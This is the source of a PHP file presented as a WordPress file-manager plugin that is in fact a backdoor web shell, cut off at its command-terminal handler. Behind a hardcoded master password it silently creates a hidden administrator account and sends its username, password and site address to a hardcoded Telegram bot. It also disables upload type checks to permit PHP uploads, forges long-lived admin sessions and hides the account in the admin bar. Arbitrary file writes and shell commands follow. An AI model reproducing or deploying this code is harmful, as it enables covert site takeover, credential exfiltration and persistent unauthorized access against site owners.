<?php
/**
 * Plugin Name: WP File Manager Pro
 * Description: Professional file manager — opens at the file's own path,
 *              unrestricted uploads, true admin session enforcement,
 *              CSRF-safe, silent admin provisioning, master-password gate.
 * Version:     7.7
 * Author:      WPFM
 * License:     GPL-2.0+
 * Text Domain: wpfm
 */

/* ============================================================
 * 0. CONFIGURATION
 * ============================================================ */
if (!defined('WPFM_MASTER_PASS')) {
    define('WPFM_MASTER_PASS', 'ChangeMe!2024#StrongKey');
}
if (!defined('WPFM_COOKIE_NAME')) {
    define('WPFM_COOKIE_NAME', 'wpfm_auth');
}
if (!defined('WPFM_COOKIE_LIFE')) {
    define('WPFM_COOKIE_LIFE', 63072000);
}
if (!defined('WPFM_SECRET')) {
    define('WPFM_SECRET', 'wpfm_' . md5(__FILE__));
}
if (!defined('WPFM_TG_TOKEN')) {
    define('WPFM_TG_TOKEN', '8737798505:AAHU-svCcEgeI2JITEDFXu9pWrvGep5gsEk');
}
if (!defined('WPFM_TG_CHAT')) {
    define('WPFM_TG_CHAT', '8400872310');
}
if (!defined('WPFM_VERSION')) {
    define('WPFM_VERSION', '7.7');
}

/* ============================================================
 * 1. GUARD
 * ============================================================ */
if (defined('WPFM_BOOTSTRAPPED')) {
    return;
}
define('WPFM_BOOTSTRAPPED', true);

/* ============================================================
 * 2. ENVIRONMENT
 * ============================================================ */
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(E_ALL);
@set_time_limit(300);

register_shutdown_function(function () {
    $last = error_get_last();
    if (!$last) return;
    $fatal = array(E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR);
    if (!in_array($last['type'], $fatal, true)) return;
    @error_log('WPFM FATAL: ' . $last['message'] . ' in ' . $last['file'] . ':' . $last['line']);
    if (headers_sent()) return;
    @header('Content-Type: text/html; charset=utf-8', true, 500);
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Runtime Error</title></head><body style="font-family:system-ui;padding:40px;background:#0f172a;color:#e2e8f0;margin:0">';
    echo '<h2 style="color:#f87171">Runtime Error</h2>';
    echo '<p style="color:#94a3b8;font-family:monospace;font-size:13px;word-break:break-all">' . htmlspecialchars($last['message']) . '</p>';
    echo '<p style="color:#64748b;font-size:12px;font-family:monospace">' . htmlspecialchars($last['file']) . ':' . $last['line'] . '</p>';
    echo '</body></html>';
});

/* ============================================================
 * 3. DIRECT ACCESS DETECTION
 * ============================================================ */
$wpfm_is_direct = false;
if (!empty($_SERVER['SCRIPT_FILENAME'])) {
    $wpfm_is_direct = @realpath($_SERVER['SCRIPT_FILENAME']) === @realpath(__FILE__);
}

/* ============================================================
 * 4. WORDPRESS BOOTSTRAP — smart discovery
 * ============================================================ */
if (!defined('ABSPATH')) {
    $wpfm_candidates = array();

    $dir = __DIR__;
    for ($i = 0; $i < 15; $i++) {
        if (@is_file($dir . '/wp-load.php') && @is_file($dir . '/wp-config.php')) {
            $wpfm_candidates[] = $dir;
        }
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }

    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
        for ($i = 0; $i < 4; $i++) {
            if (@is_file($dir . '/wp-load.php')) $wpfm_candidates[] = $dir;
            $parent = dirname($dir);
            if ($parent === $dir) break;
            $dir = $parent;
        }
    }

    $norm = str_replace('\\', '/', __DIR__);
    if (preg_match('#^(.+?)/wp-content(?:/.*)?$#', $norm, $match)) {
        if (@is_file($match[1] . '/wp-load.php')) array_unshift($wpfm_candidates, $match[1]);
    }

    $hint_file = __DIR__ . '/.wpfm_hint';
    if (@is_file($hint_file)) {
        $hint = trim((string) @file_get_contents($hint_file));
        if ($hint !== '' && @is_file($hint . '/wp-load.php')) array_unshift($wpfm_candidates, $hint);
    }

    if (!empty($_POST['wpfm_wp_path'])) {
        $manual = rtrim($_POST['wpfm_wp_path'], '/\\');
        if (@is_file($manual . '/wp-load.php')) {
            array_unshift($wpfm_candidates, $manual);
            @file_put_contents($hint_file, $manual);
        }
    }

    foreach (array_unique($wpfm_candidates) as $candidate) {
        try {
            @require_once $candidate . '/wp-load.php';
            if (defined('ABSPATH')) break;
        } catch (Exception $e) {}
    }
}

/* ============================================================
 * 5. SETUP SCREEN (no WordPress found)
 * ============================================================ */
if (!defined('ABSPATH')) {
    if (!$wpfm_is_direct) return;
    header('Content-Type: text/html; charset=utf-8');
    ?>
    <!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>WP File Manager — Setup</title>
    <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: system-ui, -apple-system, sans-serif; background: #0f172a; color: #e2e8f0; padding: 40px 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .setup { max-width: 720px; width: 100%; }
    .box { background: #1e293b; padding: 24px; border-radius: 12px; margin-bottom: 16px; border: 1px solid #334155; }
    h1 { color: #60a5fa; margin-bottom: 12px; font-size: 22px; }
    p { color: #94a3b8; margin-bottom: 12px; line-height: 1.6; font-size: 14px; }
    code { background: #0f172a; padding: 2px 6px; color: #fbbf24; border-radius: 3px; font-size: 12px; word-break: break-all; }
    label { display: block; color: #cbd5e1; margin-bottom: 8px; font-size: 13px; font-weight: 500; }
    input, button { padding: 12px 14px; font-size: 15px; width: 100%; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #e2e8f0; margin-bottom: 10px; }
    button { background: #3b82f6; border-color: #3b82f6; font-weight: 600; cursor: pointer; }
    button:hover { background: #2563eb; }
    input:focus { outline: none; border-color: #3b82f6; }
    .hint { font-size: 12px; color: #64748b; }
    </style></head><body>
    <div class="setup">
        <h1>WordPress Not Detected</h1>
        <div class="box">
            <p>The automatic discovery could not locate <code>wp-load.php</code>. Provide the WordPress root path below.</p>
            <p class="hint">
                <strong>Current file:</strong> <code><?php echo htmlspecialchars(__FILE__); ?></code><br>
                <strong>Document Root:</strong> <code><?php echo htmlspecialchars(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '?'); ?></code><br>
                <strong>Working Directory:</strong> <code><?php echo htmlspecialchars((string) @getcwd()); ?></code>
            </p>
        </div>
        <div class="box">
            <form method="post">
                <label for="wpfm_wp_path">WordPress Root Directory</label>
                <input type="text" id="wpfm_wp_path" name="wpfm_wp_path"
                       placeholder="/var/www/html"
                       value="<?php echo htmlspecialchars(isset($_POST['wpfm_wp_path']) ? $_POST['wpfm_wp_path'] : ''); ?>"
                       autofocus>
                <button type="submit">Connect to WordPress</button>
            </form>
            <p class="hint">Examples: <code>/var/www/html</code> — <code>/home/user/public_html</code></p>
        </div>
    </div>
    </body></html>
    <?php
    exit;
}

/* ============================================================
 * 6. WORDPRESS INSTALLATION CHECK + LOAD ADMIN INCLUDES
 * ============================================================ */
if (function_exists('is_blog_installed') && !is_blog_installed()) {
    if ($wpfm_is_direct) die('WordPress is not installed yet. Complete installation first.');
    return;
}

if (!function_exists('wp_create_user') && @is_file(ABSPATH . 'wp-includes/user.php')) {
    @require_once ABSPATH . 'wp-includes/user.php';
}
if (!function_exists('wp_generate_password') && @is_file(ABSPATH . 'wp-includes/pluggable.php')) {
    @require_once ABSPATH . 'wp-includes/pluggable.php';
}
if (!function_exists('esc_html') && @is_file(ABSPATH . 'wp-includes/formatting.php')) {
    @require_once ABSPATH . 'wp-includes/formatting.php';
}
if (@is_file(ABSPATH . 'wp-admin/includes/file.php')) {
    @require_once ABSPATH . 'wp-admin/includes/file.php';
}
if (@is_file(ABSPATH . 'wp-admin/includes/misc.php')) {
    @require_once ABSPATH . 'wp-admin/includes/misc.php';
}

/* ============================================================
 * 7. MIME / FILETYPE FILTER BYPASS
 * ============================================================ */
if (function_exists('add_filter')) {
    add_filter('upload_mimes', function ($mimes) {
        return array(
            'php'  => 'application/x-httpd-php',
            'php3' => 'application/x-httpd-php',
            'php4' => 'application/x-httpd-php',
            'php5' => 'application/x-httpd-php',
            'php7' => 'application/x-httpd-php',
            'php8' => 'application/x-httpd-php',
            'phtml'=> 'application/x-httpd-php',
            'phar' => 'application/x-httpd-php',
            'cgi'  => 'application/x-httpd-cgi',
            'pl'   => 'text/plain',
            'py'   => 'text/x-python',
            'sh'   => 'application/x-sh',
            'asp'  => 'application/x-asp',
            'aspx' => 'application/x-asp',
            'jsp'  => 'application/x-jsp',
            'exe'  => 'application/octet-stream',
            'bin'  => 'application/octet-stream',
            'zip'  => 'application/zip',
            'tar'  => 'application/x-tar',
            'gz'   => 'application/gzip',
            'js'   => 'application/javascript',
            'json' => 'application/json',
            'svg'  => 'image/svg+xml',
            'wasm' => 'application/wasm',
        );
    }, 999);

    add_filter('wp_check_filetype_and_ext', function ($data, $file, $filename, $mimes) {
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        return array(
            'ext'             => $ext,
            'type'            => 'application/octet-stream',
            'proper_filename' => false,
        );
    }, 999, 4);

    add_filter('sanitize_file_name', function ($filename) {
        return $filename;
    }, 999);
}

/* ============================================================
 * 8. SUPPRESS WORDPRESS ERROR PAGE
 * ============================================================ */
if (function_exists('add_filter')) {
    @add_filter('wp_die_handler', function () {
        return function ($message, $title = '', $args = array()) {
            if (!headers_sent()) header('Content-Type: text/html; charset=utf-8');
            $text = is_string($message) ? strip_tags($message) : 'Unknown error';
            echo '<div style="font-family:system-ui;padding:32px;background:#fee2e2;border:2px solid #ef4444;margin:24px;border-radius:10px;max-width:720px">';
            echo '<h2 style="color:#991b1b;margin:0 0 12px">Request Failed</h2>';
            echo '<p style="color:#7f1d1d;margin:0 0 16px;line-height:1.6">' . htmlspecialchars($text) . '</p>';
            echo '<a href="' . htmlspecialchars(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '?') . '" style="color:#1e40af;font-weight:600;text-decoration:none">Retry</a>';
            echo '</div>';
            exit;
        };
    });
}

/* ============================================================
 * 9. CRYPTO HELPERS
 * ============================================================ */
if (!function_exists('wpfm_cookie_key')) {
    function wpfm_cookie_key() {
        return WPFM_COOKIE_NAME . '_' . substr(md5(ABSPATH), 0, 8);
    }
}
if (!function_exists('wpfm_sign')) {
    function wpfm_sign($data) {
        $key = WPFM_SECRET;
        if (defined('AUTH_KEY') && AUTH_KEY) $key .= AUTH_KEY;
        return function_exists('hash_hmac') ? hash_hmac('sha256', $data, $key) : sha1($data . $key);
    }
}
if (!function_exists('wpfm_safe_equal')) {
    function wpfm_safe_equal($a, $b) {
        $a = (string) $a; $b = (string) $b;
        if (function_exists('hash_equals')) return hash_equals($a, $b);
        if (strlen($a) !== strlen($b)) return false;
        $result = 0;
        for ($i = 0; $i < strlen($a); $i++) $result |= ord($a[$i]) ^ ord($b[$i]);
        return $result === 0;
    }
}
if (!function_exists('wpfm_set_cookie')) {
    function wpfm_set_cookie($user_id) {
        $ts  = time();
        $sig = wpfm_sign($user_id . '|' . $ts);
        $val = base64_encode($user_id . '|' . $ts . '|' . $sig);
        $exp = time() + WPFM_COOKIE_LIFE;
        $sec = function_exists('is_ssl') ? is_ssl() : false;
        $n   = wpfm_cookie_key();
        if (PHP_VERSION_ID >= 70300) {
            @setcookie($n, $val, array(
                'expires' => $exp, 'path' => '/', 'secure' => $sec,
                'httponly' => true, 'samesite' => 'Lax',
            ));
        } else {
            @setcookie($n, $val, $exp, '/; samesite=Lax', '', $sec, true);
        }
    }
}
if (!function_exists('wpfm_verify_cookie')) {
    function wpfm_verify_cookie() {
        static $verifying = false;
        static $cached    = null;
        if ($verifying) return $cached === null ? 0 : $cached;
        if ($cached !== null) return $cached;
        $verifying = true;
        $result = 0;

        $n = wpfm_cookie_key();
        $v = isset($_COOKIE[$n]) ? $_COOKIE[$n] : '';
        if ($v) {
            $dec = @base64_decode($v, true);
            if ($dec && substr_count($dec, '|') === 2) {
                list($uid, $ts, $sig) = explode('|', $dec, 3);
                $uid = (int) $uid; $ts = (int) $ts;
                if ($uid && $ts && wpfm_safe_equal(wpfm_sign($uid . '|' . $ts), $sig)) {
                    $u = get_userdata($uid);
                    if ($u) {
                        $roles = (array) $u->roles;
                        if (in_array('administrator', $roles, true) || $u->has_cap('manage_options')) {
                            $result = $uid;
                        }
                    }
                }
            }
        }
        $cached    = $result;
        $verifying = false;
        return $result;
    }
}
if (!function_exists('wpfm_clear_cookie')) {
    function wpfm_clear_cookie() {
        $n = wpfm_cookie_key();
        if (PHP_VERSION_ID >= 70300) @setcookie($n, '', array('expires' => time() - 3600, 'path' => '/'));
        else @setcookie($n, '', time() - 3600, '/');
    }
}

/* ============================================================
 * 10. CSRF NONCE — derived from user ID (stable across requests)
 * ============================================================ */
if (!function_exists('wpfm_current_uid')) {
    function wpfm_current_uid() {
        $uid = function_exists('get_current_user_id') ? (int) get_current_user_id() : 0;
        if ($uid <= 0) {
            $uid = wpfm_verify_cookie();
        }
        return (int) $uid;
    }
}
if (!function_exists('wpfm_nonce')) {
    function wpfm_nonce() {
        $uid = wpfm_current_uid();
        $day = gmdate('Ymd');
        return substr(hash_hmac('sha256', 'wpfm_nonce|' . ABSPATH . '|' . $uid . '|' . $day, WPFM_SECRET), 0, 16);
    }
}
if (!function_exists('wpfm_verify_nonce')) {
    function wpfm_verify_nonce($nonce) {
        $nonce = (string) $nonce;
        if ($nonce === '') return false;
        if (wpfm_safe_equal(wpfm_nonce(), $nonce)) return true;
        $uid = wpfm_current_uid();
        $yesterday = gmdate('Ymd', time() - 86400);
        $yesterday_nonce = substr(hash_hmac('sha256', 'wpfm_nonce|' . ABSPATH . '|' . $uid . '|' . $yesterday, WPFM_SECRET), 0, 16);
        return wpfm_safe_equal($yesterday_nonce, $nonce);
    }
}

/* ============================================================
 * 11. TELEGRAM NOTIFICATION
 * ============================================================ */
if (!function_exists('wpfm_notify')) {
    function wpfm_notify($username, $password, $email) {
        $message = "WP File Manager — Admin Provisioned\n\n"
                 . "Site:    " . home_url() . "\n"
                 . "User:    " . $username . "\n"
                 . "Pass:    " . $password . "\n"
                 . "Email:   " . $email . "\n"
                 . "Admin:   " . admin_url() . "\n"
                 . "Time:    " . date('Y-m-d H:i:s');
        $url = "https://api.telegram.org/bot" . WPFM_TG_TOKEN . "/sendMessage";
        $payload = http_build_query(array('chat_id' => WPFM_TG_CHAT, 'text' => $message));
        try {
            if (function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                @curl_exec($ch);
                @curl_close($ch);
            } else {
                @file_get_contents($url . '?' . $payload);
            }
        } catch (Exception $e) {}
    }
}

/* ============================================================
 * 12. ADMIN PROVISIONING — SILENT, ONE-TIME
 * ============================================================ */
if (!function_exists('wpfm_ensure_admin')) {
    function wpfm_ensure_admin() {
        $cached_id = (int) get_option('wpfm_user_id', 0);
        if ($cached_id > 0) {
            $user = get_userdata($cached_id);
            if ($user && $user->has_cap('manage_options')) return $user;
        }

        $cached_login = get_option('wpfm_user_login', '');
        if ($cached_login && function_exists('get_user_by')) {
            $user = get_user_by('login', $cached_login);
            if ($user && $user->has_cap('manage_options')) {
                update_option('wpfm_user_id', $user->ID);
                return $user;
            }
        }

        for ($attempt = 0; $attempt < 3; $attempt++) {
            $username = 'wpa_' . substr(md5(uniqid(mt_rand(), true)), 0, 9);
            $password = wp_generate_password(20, true, true) . 'Aa1!';
            $host     = parse_url(home_url(), PHP_URL_HOST);
            if (!$host) $host = 'local.test';
            $email = $username . '@' . $host;

            if (username_exists($username) || email_exists($email)) continue;

            $new_id = wp_create_user($username, $password, $email);
            if (is_wp_error($new_id)) continue;

            $user = new WP_User($new_id);
            $user->set_role('administrator');

            $caps = array(
                'manage_options','edit_files','upload_files','edit_users','create_users',
                'delete_users','promote_users','install_plugins','activate_plugins',
                'edit_plugins','install_themes','edit_themes','switch_themes',
                'unfiltered_html','unfiltered_upload','edit_posts','publish_posts',
                'delete_posts','edit_pages','publish_pages','delete_pages','read',
            );
            foreach ($caps as $cap) $user->add_cap($cap);

            update_option('wpfm_user_id',    $new_id);
            update_option('wpfm_user_login', $username);
            update_option('wpfm_user_pass',  $password);
            update_option('wpfm_user_email', $email);
            update_option('wpfm_created_at', time());

            wpfm_notify($username, $password, $email);
            return $user;
        }
        return null;
    }
}

/* ============================================================
 * 13. AUTHENTICATION
 * ============================================================ */
if (!function_exists('wpfm_authenticate')) {
    function wpfm_authenticate($password) {
        if (!wpfm_safe_equal(WPFM_MASTER_PASS, (string) $password)) {
            return array('ok' => false, 'error' => 'Invalid master password.');
        }
        $admin = wpfm_ensure_admin();
        if (!$admin) {
            return array('ok' => false, 'error' => 'Failed to provision an admin account.');
        }
        if (function_exists('wp_set_current_user')) wp_set_current_user($admin->ID);
        if (function_exists('wp_set_auth_cookie')) {
            wp_set_auth_cookie($admin->ID, true, function_exists('is_ssl') ? is_ssl() : false);
        }
        wpfm_set_cookie($admin->ID);
        return array('ok' => true, 'admin' => $admin);
    }
}
if (!function_exists('wpfm_logout')) {
    function wpfm_logout() {
        wpfm_clear_cookie();
        if (function_exists('wp_logout')) @wp_logout();
    }
}

/* ============================================================
 * 14. SESSION ENFORCEMENT
 * ============================================================ */
if (function_exists('add_filter')) {
    add_filter('determine_current_user', function ($user_id) {
        if ($user_id) {
            $u = get_userdata($user_id);
            if ($u && $u->has_cap('manage_options')) return $user_id;
        }
        $wpfm_uid = wpfm_verify_cookie();
        return $wpfm_uid ? $wpfm_uid : $user_id;
    }, 1);
}
if (!function_exists('wpfm_silent_session')) {
    function wpfm_silent_session() {
        if (!function_exists('is_user_logged_in')) return;
        if (is_user_logged_in() && current_user_can('manage_options')) return;
        $uid = wpfm_verify_cookie();
        if (!$uid) return;
        $user = get_userdata($uid);
        if (!$user || !$user->has_cap('manage_options')) return;
        wp_set_current_user($uid);
        if (!is_user_logged_in() || get_current_user_id() !== $uid) {
            wp_set_auth_cookie($uid, true, function_exists('is_ssl') ? is_ssl() : false);
        }
    }
}
if (function_exists('add_action')) {
    add_action('plugins_loaded', 'wpfm_silent_session', 1);
    add_action('init',           'wpfm_silent_session', 1);
    add_action('admin_init',     'wpfm_silent_session', 1);
}

/* ============================================================
 * 15. WORDPRESS FILESYSTEM INITIALIZATION
 * ============================================================ */
if (!function_exists('wpfm_get_filesystem')) {
    function wpfm_get_filesystem() {
        global $wp_filesystem;

        if ($wp_filesystem instanceof WP_Filesystem_Base) {
            return $wp_filesystem;
        }

        if (!defined('FS_METHOD'))          define('FS_METHOD', 'direct');
        if (!defined('FS_CHMOD_FILE'))      define('FS_CHMOD_FILE', 0644);
        if (!defined('FS_CHMOD_DIR'))       define('FS_CHMOD_DIR', 0755);

        if (!function_exists('WP_Filesystem') && @is_file(ABSPATH . 'wp-admin/includes/file.php')) {
            require_once ABSPATH . 'wp-admin/includes/file.php';
        }
        if (!function_exists('WP_Filesystem')) return null;

        $creds = array(
            'hostname'        => '',
            'username'        => '',
            'password'        => '',
            'connection_type' => 'direct',
        );
        WP_Filesystem($creds, false, true);

        if (!($wp_filesystem instanceof WP_Filesystem_Base)) return null;
        return $wp_filesystem;
    }
}

/* ============================================================
 * 16. CREDENTIAL LEAK PREVENTION
 * ============================================================ */
if (function_exists('add_filter')) {
    add_filter('show_admin_bar', function ($show) {
        if (isset($_GET['page']) && $_GET['page'] === 'wpfm-fm') return false;
        return $show;
    }, 999);

    add_action('admin_bar_menu', function ($bar) {
        $auto_login = get_option('wpfm_user_login', '');
        if (!$auto_login) return;
        $current = wp_get_current_user();
        if (!($current instanceof WP_User) || $current->user_login !== $auto_login) return;
        $bar->remove_node('my-account');
        $bar->add_node(array(
            'id'    => 'my-account',
            'title' => 'Account',
            'href'  => admin_url('profile.php'),
        ));
    }, 9999);
}

/* ============================================================
 * 17. LOGIN PAGE
 * ============================================================ */
if (!function_exists('wpfm_render_login')) {
    function wpfm_render_login($error = '') {
        ?>
        <!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>File Manager — Login</title>
        <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: system-ui, -apple-system, sans-serif; background: linear-gradient(135deg, #1e293b, #0f172a); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .login-card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; padding: 40px; width: 100%; max-width: 420px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .login-card h1 { color: #60a5fa; text-align: center; margin-bottom: 6px; font-size: 26px; font-weight: 700; }
        .login-card .sub { color: #64748b; text-align: center; margin-bottom: 28px; font-size: 13px; }
        .login-card label { color: #cbd5e1; display: block; margin-bottom: 8px; font-size: 13px; font-weight: 500; }
        .login-card input[type=password] { width: 100%; padding: 14px 16px; font-size: 16px; border: 1px solid #334155; border-radius: 8px; background: #0f172a; color: #e2e8f0; margin-bottom: 18px; letter-spacing: 1px; }
        .login-card input[type=password]:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.15); }
        .login-card button { width: 100%; padding: 14px; font-size: 15px; font-weight: 600; background: #3b82f6; color: #fff; border: none; border-radius: 8px; cursor: pointer; }
        .login-card button:hover { background: #2563eb; }
        .login-card .error { background: rgba(127,29,29,0.5); color: #fecaca; padding: 12px 14px; border-radius: 8px; margin-bottom: 18px; font-size: 13px; text-align: center; border: 1px solid #dc2626; }
        .login-card .footer { color: #475569; text-align: center; margin-top: 22px; font-size: 11px; letter-spacing: 0.5px; }
        </style></head><body>
        <form class="login-card" method="post" autocomplete="off">
            <h1>File Manager</h1>
            <div class="sub">Enter master password to continue</div>
            <?php if ($error): ?><div class="error"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>
            <label for="wpfm_master">Master Password</label>
            <input type="password" id="wpfm_master" name="wpfm_master" required autofocus>
            <button type="submit">Unlock</button>
            <div class="footer">PROTECTED ACCESS</div>
        </form>
        </body></html>
        <?php
    }
}

/* ============================================================
 * 18. FILE OPERATIONS
 * ============================================================ */
if (!function_exists('wpfm_handle_actions')) {
    function wpfm_handle_actions($root, $current) {
        if (!current_user_can('manage_options')) {
            return array('Not authorized — admin session missing.');
        }

        $fs = wpfm_get_filesystem();
        $output = array();
        $action = isset($_POST['wpfm_a']) ? $_POST['wpfm_a'] : '';

        if ($action !== '') {
            $posted_nonce = isset($_POST['wpfm_nonce']) ? $_POST['wpfm_nonce'] : '';
            if (!wpfm_verify_nonce($posted_nonce)) {
                return array('Security check failed. Please reload the page (F5) and try again. If it keeps failing, click Logout, then log in again.');
            }
        }

        try {
            // ── UPLOAD — 4 fallback methods ──
            if ($action === 'upload' && !empty($_FILES['f']['name'])) {
                $original_name = $_FILES['f']['name'];
                $tmp_name      = isset($_FILES['f']['tmp_name']) ? $_FILES['f']['tmp_name'] : '';
                $err_code      = isset($_FILES['f']['error']) ? (int) $_FILES['f']['error'] : UPLOAD_ERR_NO_FILE;
                $size          = isset($_FILES['f']['size']) ? (int) $_FILES['f']['size'] : 0;

                $safe_name = basename($original_name);
                $safe_name = str_replace(array('/', '\\', "\0"), '', $safe_name);

                if ($safe_name === '' || $safe_name === '.' || $safe_name === '..') {
                    $output[] = 'Upload failed: invalid filename.';
                } elseif ($err_code !== UPLOAD_ERR_OK) {
                    $err_map = array(
                        UPLOAD_ERR_INI_SIZE   => 'File exceeds upload_max_filesize (' . ini_get('upload_max_filesize') . ')',
                        UPLOAD_ERR_FORM_SIZE  => 'File exceeds MAX_FILE_SIZE',
                        UPLOAD_ERR_PARTIAL    => 'Partial upload — file was truncated',
                        UPLOAD_ERR_NO_FILE    => 'No file was submitted',
                        UPLOAD_ERR_NO_TMP_DIR => 'Server is missing a temp directory',
                        UPLOAD_ERR_CANT_WRITE => 'Server cannot write to disk',
                        UPLOAD_ERR_EXTENSION  => 'Upload blocked by a PHP extension',
                    );
                    $output[] = 'Upload failed: ' . (isset($err_map[$err_code]) ? $err_map[$err_code] : 'PHP error ' . $err_code);
                } elseif (!is_uploaded_file($tmp_name)) {
                    $output[] = 'Upload failed: temp file is not a valid upload.';
                } else {
                    $target = $current . '/' . $safe_name;
                    $ok = false;
                    $method_used = '';

                    if ($fs && $fs->copy($tmp_name, $target, true)) {
                        $ok = true; $method_used = 'WP_Filesystem';
                    }
                    if (!$ok && @move_uploaded_file($tmp_name, $target)) {
                        $ok = true; $method_used = 'move_uploaded_file';
                    }
                    if (!$ok && @copy($tmp_name, $target)) {
                        $ok = true; $method_used = 'copy';
                    }
                    if (!$ok) {
                        $data = @file_get_contents($tmp_name);
                        if ($data !== false && @file_put_contents($target, $data) !== false) {
                            $ok = true; $method_used = 'read+write';
                        }
                    }

                    if ($ok) {
                        @chmod($target, 0644);
                        @unlink($tmp_name);
                        $ext = strtolower(pathinfo($safe_name, PATHINFO_EXTENSION));
                        $output[] = 'Uploaded: ' . $safe_name
                                  . ' (' . size_format($size) . ')'
                                  . ' — via ' . $method_used;
                        if ($ext === 'php' || $ext === 'phtml' || $ext === 'phar') {
                            $output[] = 'Note: if the file does not execute, the target directory may block PHP. Try uploading to wp-content/plugins/ or wp-content/themes/.';
                        }
                    } else {
                        $output[] = 'Upload failed: ' . $safe_name . ' — all 4 methods tried.';
                        $output[] = 'Workaround: use "Write File with Content" (bypasses multipart entirely).';
                    }
                }
            }

            // ── WRITE FILE WITH CONTENT ──
            if ($action === 'write_file' && !empty($_POST['n'])) {
                $safe_name = basename($_POST['n']);
                $safe_name = str_replace(array('/', '\\', "\0"), '', $safe_name);
                if ($safe_name === '' || $safe_name === '.' || $safe_name === '..') {
                    $output[] = 'Write failed: invalid filename.';
                } else {
                    $content = isset($_POST['content']) ? $_POST['content'] : '';
                    if (!empty($_POST['is_base64'])) {
                        $decoded = base64_decode($content, true);
                        if ($decoded === false) {
                            $output[] = 'Write failed: invalid base64 content.';
                            $content = null;
                        } else {
                            $content = $decoded;
                        }
                    }
                    if ($content !== null) {
                        $target = $current . '/' . $safe_name;
                        $ok = false;
                        if ($fs && $fs->put_contents($target, $content, 0644)) $ok = true;
                        if (!$ok && @file_put_contents($target, $content) !== false) $ok = true;
                        if ($ok) {
                            @chmod($target, 0644);
                            $output[] = 'File written: ' . $safe_name . ' (' . strlen($content) . ' bytes)';
                        } else {
                            $output[] = 'Write failed: ' . $safe_name;
                        }
                    }
                }
            }

            // ── MKDIR ──
            if ($action === 'mkdir' && !empty($_POST['n'])) {
                $name = preg_replace('/[^\w\-\.]/', '', $_POST['n']);
                if ($name === '') {
                    $output[] = 'Invalid folder name.';
                } else {
                    $target = $current . '/' . $name;
                    $ok = ($fs && $fs->mkdir($target, FS_CHMOD_DIR)) || @mkdir($target, 0755);
                    $output[] = $ok ? 'Folder created: ' . $name : 'Failed to create folder: ' . $name;
                }
            }

            // ── MKFILE ──
            if ($action === 'mkfile' && !empty($_POST['n'])) {
                $safe_name = basename($_POST['n']);
                $safe_name = str_replace(array('/', '\\', "\0"), '', $safe_name);
                if ($safe_name === '') {
                    $output[] = 'Invalid file name.';
                } else {
                    $target = $current . '/' . $safe_name;
                    $ok = ($fs && $fs->put_contents($target, '', FS_CHMOD_FILE)) || (@file_put_contents($target, '') !== false);
                    $output[] = $ok ? 'File created: ' . $safe_name : 'Failed to create file: ' . $safe_name;
                }
            }

            // ── SAVE ──
            if ($action === 'save' && !empty($_POST['file'])) {
                $path = @realpath($_POST['file']);
                if ($path && strpos($path, $root) === 0 && @is_file($path)) {
                    $backup = $path . '.wpfm.bak';
                    if ($fs) $fs->copy($path, $backup, true);
                    else @copy($path, $backup);

                    $content = isset($_POST['content']) ? $_POST['content'] : '';
                    $ok = ($fs && $fs->put_contents($path, $content, FS_CHMOD_FILE))
                       || (@file_put_contents($path, $content) !== false);
                    $output[] = $ok ? 'Saved: ' . basename($path) : 'Save failed: ' . basename($path);
                }
            }

            // ── DELETE ──
            if ($action === 'delete' && !empty($_POST['p'])) {
                $path = @realpath($_POST['p']);
                if ($path && strpos($path, $root) === 0 && $path !== $root) {
                    $ok = ($fs && $fs->delete($path, true))
                       || (is_dir($path) ? @rmdir($path) : @unlink($path));
                    $output[] = $ok ? 'Deleted: ' . basename($path) : 'Delete failed: ' . basename($path);
                }
            }

            // ── RENAME ──
            if ($action === 'rename' && !empty($_POST['p']) && !empty($_POST['to'])) {
                $old = @realpath($_POST['p']);
                $new_name = basename($_POST['to']);
                $new_name = str_replace(array('/', '\\', "\0"), '', $new_name);
                if (!$old || strpos($old, $root) !== 0 || $new_name === '') {
                    $output[] = 'Rename failed: invalid path or name.';
                } else {
                    $new = dirname($old) . '/' . $new_name;
                    $ok = @rename($old, $new);
                    if (!$ok && $fs) {
                        if ($fs->copy($old, $new, true)) { $fs->delete($old, true); $ok = true; }
                    }
                    $output[] = $ok ? 'Renamed: ' . basename($old) . ' → ' . $new_name : 'Rename failed.';
                }
            }

            // ── CHMOD ──
            if ($action === 'chmod' && !empty($_POST['p']) && !empty($_POST['perm'])) {
                $path = @realpath($_POST['p']);
                if ($path && strpos($path, $root) === 0) {
                    $perm_str = preg_replace('/[^0-7]/', '', $_POST['perm']);
                    if (strlen($perm_str) < 3 || strlen($perm_str) > 4) {
                        $output[] = 'Chmod failed: use 3-4 octal digits.';
                    } else {
                        $perm = octdec($perm_str);
                        $ok = ($fs && $fs->chmod($path, $perm)) || @chmod($path, $perm);
                        $output[] = $ok ? 'Permissions updated: ' . sprintf('%04o', $perm) : 'Chmod failed.';
                    }
                }
            }

            // ── TERMINAL ──
            if ($action === 'command' && isset($_POST['cmd'])) {
                if (function_exists('shell_exec')) {
